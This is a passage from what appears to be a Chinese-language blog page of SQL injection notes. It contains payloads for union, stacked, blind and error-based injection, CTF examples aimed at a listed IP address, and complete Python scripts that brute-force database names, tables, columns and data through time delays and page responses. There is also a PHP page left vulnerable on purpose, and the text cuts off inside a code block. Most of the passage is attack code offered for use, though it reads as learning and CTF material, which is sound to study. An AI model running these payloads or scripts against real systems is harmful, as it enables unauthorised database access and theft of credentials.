class="built_in">where</span> table_schema=database() and table_name=<span class="string">'users</span></span><br></pre></td></tr></table></figure><p>OX5 获取各个字段值</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select null,group_concat(username,password) from users</span><br></pre></td></tr></table></figure><h1 id="注入类型"><a href="#注入类型" class="headerlink" title="注入类型"></a>注入类型</h1><h2 id="堆叠查询"><a href="#堆叠查询" class="headerlink" title="堆叠查询"></a>堆叠查询</h2><p>来自于强网杯的第三届强网杯的一题<br>题目过滤了查询删除更新插入等语句<br><img src="../../images/loopholes/sql/1.png" alt=""><br>查看表名     </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://117.78.39.172:31796/?inject=0<span class="string">';show tables;</span></span><br></pre></td></tr></table></figure><p><img src="../../images/loopholes/sql/3.png" alt=""><br>查看字段 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://117.78.39.172:31796/?inject=0<span class="string">';desc `1919810931114514`;</span></span><br></pre></td></tr></table></figure><p><img src="../../images/loopholes/sql/2.png" alt=""><br>查看数据  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://117.78.39.172:31796/?inject=0<span class="string">';show tables;SET @haha_test = CONCAT('</span>S<span class="string">','</span>ELECT * from `1919810931114514`<span class="string">');PREPARE pr2 FROM @haha_test;EXECUTE pr2 ;</span></span><br></pre></td></tr></table></figure><p><img src="../../images/loopholes/sql/4.png" alt=""> </p><p>[SUCTF 2019]EasySQL</p><p>后台sql语句如下</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> $_GET[<span class="string">'query'</span>] || flag <span class="keyword">from</span> flag</span><br></pre></td></tr></table></figure><p>在oracle 缺省支持 通过 ‘ || ’ 来实现字符串拼接，但在mysql 缺省不支持。需要调整mysql 的sql_mode模式：pipes_as_concat 来实现oracle 的一些功能</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1;<span class="keyword">set</span> sql_mode=PIPES_AS_CONCAT;<span class="keyword">select</span> <span class="number">1</span></span><br></pre></td></tr></table></figure><h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><p>时间盲注格式</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and <span class="keyword">if</span>((ascii(substr((select table_name from information_schema.tables <span class="built_in">where</span> table_schema=database() <span class="built_in">limit</span> 0,1),1,1))=97),sleep(5),0)</span><br></pre></td></tr></table></figure><h2 id="get"><a href="#get" class="headerlink" title="get"></a>get</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: ye1s</span></span><br><span class="line"><span class="comment"># @Date:   2019-01-15 16:21:36</span></span><br><span class="line"><span class="comment"># @Last Modified by:   ye1s</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2019-01-15 22:07:34</span></span><br><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">chars=<span class="string">"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%&amp;'()*+,-./:;&lt;=&gt;?@[\\]^_`&#123;|&#125;~\""</span></span><br><span class="line">url=<span class="string">"http://61.10.10.128/sqli/Less-5/?id=1"</span></span><br><span class="line">def getDbname():<span class="comment">#爆数据库</span></span><br><span class="line">result=<span class="string">""</span></span><br><span class="line">payload=<span class="string">"'and if((ascii(substr(database(),&#123;0&#125;,1))=&#123;1&#125;),sleep(5),0)%23"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(1,30):</span><br><span class="line"><span class="keyword">for</span> char <span class="keyword">in</span> chars:</span><br><span class="line">startTime=time.time()</span><br><span class="line">newurl=url+payload.format(i,ord(char))</span><br><span class="line">response=requests.get(newurl)</span><br><span class="line"><span class="keyword">if</span> time.time()-startTime&gt;5: <span class="comment">#页面判断语句记得修改</span></span><br><span class="line">result +=char</span><br><span class="line"><span class="built_in">print</span> <span class="string">"dbname is:"</span>+result</span><br><span class="line"><span class="built_in">break</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">"\""</span> == char:</span><br><span class="line"><span class="built_in">return</span></span><br><span class="line"></span><br><span class="line">def getTablename():<span class="comment">#爆表名</span></span><br><span class="line">result=<span class="string">""</span></span><br><span class="line">payload=<span class="string">"'and if((ascii(substr((select table_name from information_schema.tables where table_schema=database() limit &#123;0&#125;,1),&#123;1&#125;,1))=&#123;2&#125;),sleep(5),0)%23"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(0,15):</span><br><span class="line">tablename=<span class="string">""</span></span><br><span class="line">flag=0</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(1,33):</span><br><span class="line"><span class="keyword">if</span> flag==1: <span class="comment">#判断是否得到一个表名</span></span><br><span class="line"><span class="built_in">break</span></span><br><span class="line"><span class="keyword">for</span> char <span class="keyword">in</span> chars:</span><br><span class="line">startTime=time.time()</span><br><span class="line">newurl=url+payload.format(i,j,ord(char))</span><br><span class="line">response=requests.get(newurl)</span><br><span class="line"><span class="keyword">if</span> time.time()-startTime&gt;5:</span><br><span class="line">tablename +=char</span><br><span class="line"><span class="built_in">print</span> <span class="string">"tablename is:"</span>+tablename</span><br><span class="line"><span class="built_in">break</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">"\""</span> == char:</span><br><span class="line">flag=1</span><br><span class="line">result +=<span class="string">" "</span>+str(i)+<span class="string">":"</span>+tablename</span><br><span class="line"><span class="keyword">if</span> tablename.strip()==<span class="string">''</span>:</span><br><span class="line"><span class="built_in">return</span></span><br><span class="line"><span class="built_in">print</span> result</span><br><span class="line"><span class="built_in">break</span></span><br><span class="line">def getColumns(tablename):<span class="comment">#爆列名</span></span><br><span class="line">result=<span class="string">""</span></span><br><span class="line">payload=<span class="string">"'and if((ascii(substr((select column_name from information_schema.columns where table_name="</span>+tablename+<span class="string">" limit &#123;0&#125;,1),&#123;1&#125;,1))=&#123;2&#125;),sleep(5),0)%23"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(0,15):</span><br><span class="line">columnname=<span class="string">""</span></span><br><span class="line">flag=0</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(1,33):</span><br><span class="line"><span class="keyword">if</span> flag==1: <span class="comment">#判断是否得到一个表名</span></span><br><span class="line"><span class="built_in">break</span></span><br><span class="line"><span class="keyword">for</span> char <span class="keyword">in</span> chars:</span><br><span class="line">startTime=time.time()</span><br><span class="line">newurl=url+payload.format(i,j,ord(char))</span><br><span class="line">response=requests.get(newurl)</span><br><span class="line"><span class="keyword">if</span> time.time()-startTime&gt;5:</span><br><span class="line">columnname +=char</span><br><span class="line"><span class="built_in">print</span> tablename+<span class="string">"'columns is:"</span>+columnname</span><br><span class="line"><span class="built_in">break</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">"\""</span> == char:</span><br><span class="line">flag=1</span><br><span class="line">result +=<span class="string">" "</span>+str(i)+<span class="string">":"</span>+columnname</span><br><span class="line"><span class="built_in">print</span> result</span><br><span class="line"><span class="built_in">break</span></span><br><span class="line">def getData(columnname,tablename):</span><br><span class="line">result=<span class="string">""</span></span><br><span class="line">payload=<span class="string">"'and if(ascii(substr((select"</span>+columnname+<span class="string">"from "</span>+tablename+<span class="string">" limit &#123;0&#125;,1),&#123;1&#125;,1))=&#123;2&#125;),sleep(5),5)%23"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(0,15):</span><br><span class="line">data=<span class="string">""</span></span><br><span class="line">flag=0</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(1,33):</span><br><span class="line"><span class="keyword">if</span> flag==1: <span class="comment">#判断是否得到一个表名</span></span><br><span class="line"><span class="built_in">break</span></span><br><span class="line"><span class="keyword">for</span> char <span class="keyword">in</span> chars:</span><br><span class="line">startTime=time.time()</span><br><span class="line">newurl=url+payload.format(i,j,ord(char))</span><br><span class="line">response=requests.get(newurl)</span><br><span class="line"><span class="keyword">if</span> time.time()-startTime&gt;5:</span><br><span class="line">data +=char</span><br><span class="line"><span class="built_in">print</span> <span class="string">"data is:"</span>+data</span><br><span class="line"><span class="built_in">break</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">"\""</span> == char:</span><br><span class="line">flag=1</span><br><span class="line">result +=<span class="string">" "</span>+str(i)+<span class="string">":"</span>+data</span><br><span class="line"><span class="built_in">print</span> result</span><br><span class="line"><span class="built_in">break</span></span><br><span class="line">getDbname()</span><br></pre></td></tr></table></figure><h2 id="0x2post"><a href="#0x2post" class="headerlink" title="0x2post"></a>0x2post</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: yeSi</span></span><br><span class="line"><span class="comment"># @Date:   2019-01-16 10:03:42</span></span><br><span class="line"><span class="comment"># @Last Modified by:   yeSi</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2019-01-16 10:40:43</span></span><br><span class="line">import time</span><br><span class="line">import requests</span><br><span class="line">chars=<span class="string">"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%&amp;'()*+,-./:;&lt;=&gt;?@[\\]^_`&#123;|&#125;~\""</span></span><br><span class="line">url=<span class="string">"http://61.10.10.128/sqli/Less-17/"</span></span><br><span class="line">def getDbname():</span><br><span class="line">result=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(1,15):</span><br><span class="line"><span class="built_in">print</span> i</span><br><span class="line"><span class="keyword">for</span> char <span class="keyword">in</span> chars:</span><br><span class="line">startTime=time.time()</span><br><span class="line">payload=&#123;</span><br><span class="line"><span class="string">'uname'</span>:<span class="string">'admin'</span>,</span><br><span class="line"><span class="string">'passwd'</span>:<span class="string">"' or 1=1 and if((ascii(substr(database(),&#123;0&#125;,1))=&#123;1&#125;),sleep(5),0) --+"</span>.format(i,ord(char)),</span><br><span class="line"><span class="string">'submit'</span>:<span class="string">'Submit'</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">print</span> char</span><br><span class="line"><span class="built_in">print</span> payload</span><br><span class="line">res=requests.post(url=url,data=payload)</span><br><span class="line"><span class="keyword">if</span> time.time()-startTime&gt;5:</span><br><span class="line">result +=char</span><br><span class="line"><span class="built_in">print</span> <span class="string">"dbname is:"</span>+result</span><br><span class="line"><span class="built_in">break</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">"\""</span> == char:</span><br><span class="line"><span class="built_in">return</span></span><br><span class="line">…… </span><br><span class="line">getDbname()</span><br></pre></td></tr></table></figure><h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><p>0x1 布尔盲注语句</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and ascii(substr((select database()),1,1))&gt;64 /*判断数据库名的第一个字符的ascii值是否大于64*/</span><br></pre></td></tr></table></figure><p>0x2 爆数据库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">chars=<span class="string">"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%&amp;'()*+,-./:;&lt;=&gt;?@[\\]^_`&#123;|&#125;~\""</span></span><br><span class="line">url=<span class="string">"http://61.10.10.128/sqli/Less-5/?id=1"</span></span><br><span class="line">def getDbname():<span class="comment">#爆数据库</span></span><br><span class="line">result=<span class="string">""</span></span><br><span class="line">payload=<span class="string">"'and ascii(substr(database(),&#123;0&#125;,1))=&#123;1&#125;%23"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(1,30):</span><br><span class="line"><span class="keyword">for</span> char <span class="keyword">in</span> chars:</span><br><span class="line">newurl=url+payload.format(i,ord(char))</span><br><span class="line">response=requests.get(newurl)</span><br><span class="line"><span class="keyword">if</span> <span class="string">"You are in"</span> <span class="keyword">in</span> response.content: <span class="comment">#页面判断语句记得修改</span></span><br><span class="line">result +=char</span><br><span class="line"><span class="built_in">print</span> <span class="string">"dbname is:"</span>+result</span><br><span class="line"><span class="built_in">break</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">"\""</span> == char:</span><br><span class="line"><span class="built_in">return</span></span><br></pre></td></tr></table></figure><p>0x 爆表</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">def getTablename():<span class="comment">#爆表名</span></span><br><span class="line">result=<span class="string">""</span></span><br><span class="line">payload=<span class="string">"'and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit &#123;0&#125;,1),&#123;1&#125;,1))=&#123;2&#125;%23"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(0,15):</span><br><span class="line">tablename=<span class="string">""</span></span><br><span class="line">flag=0</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(1,33):</span><br><span class="line"><span class="keyword">if</span> flag==1: <span class="comment">#判断是否得到一个表名</span></span><br><span class="line"><span class="built_in">break</span></span><br><span class="line"><span class="keyword">for</span> char <span class="keyword">in</span> chars:</span><br><span class="line">newurl=url+payload.format(i,j,ord(char))</span><br><span class="line">response=requests.get(newurl)</span><br><span class="line"><span class="keyword">if</span> <span class="string">"You are in"</span> <span class="keyword">in</span> response.content:</span><br><span class="line">tablename +=char</span><br><span class="line"><span class="built_in">print</span> <span class="string">"tablename is:"</span>+tablename</span><br><span class="line"><span class="built_in">break</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">"\""</span> == char:</span><br><span class="line">flag=1</span><br><span class="line">result +=<span class="string">" "</span>+str(i)+<span class="string">":"</span>+tablename</span><br><span class="line"><span class="keyword">if</span> tablename.strip()==<span class="string">''</span>:</span><br><span class="line"><span class="built_in">return</span></span><br><span class="line"><span class="built_in">print</span> result</span><br><span class="line"><span class="built_in">break</span></span><br></pre></td></tr></table></figure><p>0x 爆字段</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">def getColumns(tablename):</span><br><span class="line">result=<span class="string">""</span></span><br><span class="line">payload=<span class="string">"'and ascii(substr((select column_name from information_schema.columns where table_name="</span>+tablename+<span class="string">" limit &#123;0&#125;,1),&#123;1&#125;,1))=&#123;2&#125;%23"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(0,15):</span><br><span class="line">columnname=<span class="string">""</span></span><br><span class="line">flag=0</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(1,33):</span><br><span class="line"><span class="keyword">if</span> flag==1: <span class="comment">#判断是否得到一个表名</span></span><br><span class="line"><span class="built_in">break</span></span><br><span class="line"><span class="keyword">for</span> char <span class="keyword">in</span> chars:</span><br><span class="line">newurl=url+payload.format(i,j,ord(char))</span><br><span class="line">response=requests.get(newurl)</span><br><span class="line"><span class="keyword">if</span> <span class="string">"You are in"</span> <span class="keyword">in</span> response.content:</span><br><span class="line">columnname +=char</span><br><span class="line"><span class="built_in">print</span> tablename+<span class="string">"'columns is:"</span>+columnname</span><br><span class="line"><span class="built_in">break</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">"\""</span> == char:</span><br><span class="line">flag=1</span><br><span class="line">result +=<span class="string">" "</span>+str(i)+<span class="string">":"</span>+columnname</span><br><span class="line"><span class="built_in">print</span> result</span><br><span class="line"><span class="built_in">break</span></span><br></pre></td></tr></table></figure><p>0x 爆数据</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">def getData(columnname,tablename):</span><br><span class="line">result=<span class="string">""</span></span><br><span class="line">payload=<span class="string">"'and ascii(substr((select"</span>+columnname+<span class="string">"from "</span>+tablename+<span class="string">" limit &#123;0&#125;,1),&#123;1&#125;,1))=&#123;2&#125;%23"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(0,15):</span><br><span class="line">data=<span class="string">""</span></span><br><span class="line">flag=0</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(1,33):</span><br><span class="line"><span class="keyword">if</span> flag==1: <span class="comment">#判断是否得到一个表名</span></span><br><span class="line"><span class="built_in">break</span></span><br><span class="line"><span class="keyword">for</span> char <span class="keyword">in</span> chars:</span><br><span class="line">newurl=url+payload.format(i,j,ord(char))</span><br><span class="line">response=requests.get(newurl)</span><br><span class="line"><span class="keyword">if</span> <span class="string">"You are in"</span> <span class="keyword">in</span> response.content:</span><br><span class="line">data +=char</span><br><span class="line"><span class="built_in">print</span> <span class="string">"data is:"</span>+data</span><br><span class="line"><span class="built_in">break</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">"\""</span> == char:</span><br><span class="line">flag=1</span><br><span class="line">result +=<span class="string">" "</span>+str(i)+<span class="string">":"</span>+data</span><br><span class="line"><span class="built_in">print</span> result</span><br><span class="line"><span class="built_in">break</span></span><br></pre></td></tr></table></figure><h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>0X1 floor()和rand()<br>原理:<a href="https://blog.csdn.net/qq_35544379/article/details/77453019" target="_blank" rel="noopener">https://blog.csdn.net/qq_35544379/article/details/77453019</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select count(*),2,concat(<span class="string">':'</span>,(select database()),<span class="string">':'</span>,floor(rand()*2))as a from information_schema.tables group by a       /*利用错误信息得到当前数据库名*/</span><br></pre></td></tr></table></figure><p>0X2 ExtractValue(有长度限制,最长32位)<br>原理: <a href="https://www.cnblogs.com/xishaonian/p/6250444.html" target="_blank" rel="noopener">https://www.cnblogs.com/xishaonian/p/6250444.html</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)))</span><br></pre></td></tr></table></figure><p>0X3 UpdateXml(有长度限制,最长32位)<br>原理: <a href="https://www.jb51.net/article/125599.htm" target="_blank" rel="noopener">https://www.jb51.net/article/125599.htm</a> </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1))</span><br></pre></td></tr></table></figure><p>0X4 exp()<br>原理:<a href="https://www.cnblogs.com/lcamry/articles/5509124.html" target="_blank" rel="noopener">https://www.cnblogs.com/lcamry/articles/5509124.html</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and EXP(~(SELECT * from(select user())a))</span><br></pre></td></tr></table></figure><p>0X5 geometrycollection()</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id = 1 AND GeometryCollection((select * from (select * from(select user())a)b))</span><br></pre></td></tr></table></figure><p>0X6 polygon()</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id =1 AND polygon((select * from(select * from(select user())a)b))</span><br></pre></td></tr></table></figure><p>0X7 multipoint()</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id = 1 AND multipoint((select * from(select * from(select user())a)b))</span><br></pre></td></tr></table></figure><p>0X8 multilinestring()</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id = 1 AND multilinestring((select * from(select * from(select user())a)b))</span><br></pre></td></tr></table></figure><p>0X9 linestring()</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id = 1 AND LINESTRING((select * from(select * from(select user())a)b))</span><br></pre></td></tr></table></figure><p>0X10 multipolygon()</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id =1 AND multipolygon((select * from(select * from(select user())a)b))</span><br></pre></td></tr></table></figure><h1 id="注入方式"><a href="#注入方式" class="headerlink" title="注入方式"></a>注入方式</h1><h2 id="limit-注入"><a href="#limit-注入" class="headerlink" title="limit 注入"></a>limit 注入</h2><p>详情可看: <a href="https://www.leavesongs.com/PENETRATION/sql-injections-in-mysql-limit-clause.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/sql-injections-in-mysql-limit-clause.html</a><br>注入姿势<br>报错注入  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT field FROM user WHERE id &gt;0 ORDER BY id LIMIT 1,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1);</span><br></pre></td></tr></table></figure><p>时间注入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT field FROM table WHERE id &gt; 0 ORDER BY id LIMIT 1,1 PROCEDURE analyse((select extractvalue(rand(),concat(0x3a,(IF(MID(version(),1,1) LIKE 5, BENCHMARK(5000000,SHA1(1)),1))))),1)</span><br></pre></td></tr></table></figure><p>测试代码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">header(<span class="string">"Content-Type: text/plain; charset=utf-8"</span>);</span><br><span class="line">require(<span class="string">"mysql.class.php"</span>);</span><br><span class="line"><span class="variable">$mysql</span> = new MySQL(<span class="string">"test"</span>, <span class="string">"root"</span>, <span class="string">"root"</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$users</span> = <span class="variable">$mysql</span>-&gt;executeSQL(<span class="string">"SELECT * FROM user where uid &lt; 100 ORDER BY uid limit &#123;<span class="variable">$_GET</span>['p']&#125;, 10"</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$users</span>)&#123;</span><br><span class="line"><span class="variable">$users</span> = var_export(<span class="variable">$users</span>, TRUE);</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$users</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$mysql</span>-&gt;lastError;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><p>详细可看：<a href="https://xz.aliyun.com/t/1719" target="_blank" rel="noopener">https://xz.aliyun.com/t/1719</a><br>在我们正常情况下使用addslashes函数或是开启PHPGPC（注：在php5.4已上已给删除，并且需要说明特别说明一点，GPC无法过滤$_SERVER提交的参数）时过滤GET、POST、COOKIE、REQUSET 提交的参数时，黑客们使用的预定义字符会给转义成添加反斜杠的字符串如下面的例子  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%df%27===(addslashes)===&gt;%df%5c%27===(数据库GBK)===&gt;運<span class="string">'</span></span><br></pre></td></tr></table></figure><p>注入姿势：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=%df<span class="string">'order by 1 %23</span></span><br></pre></td></tr></table></figure><p>题目 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span 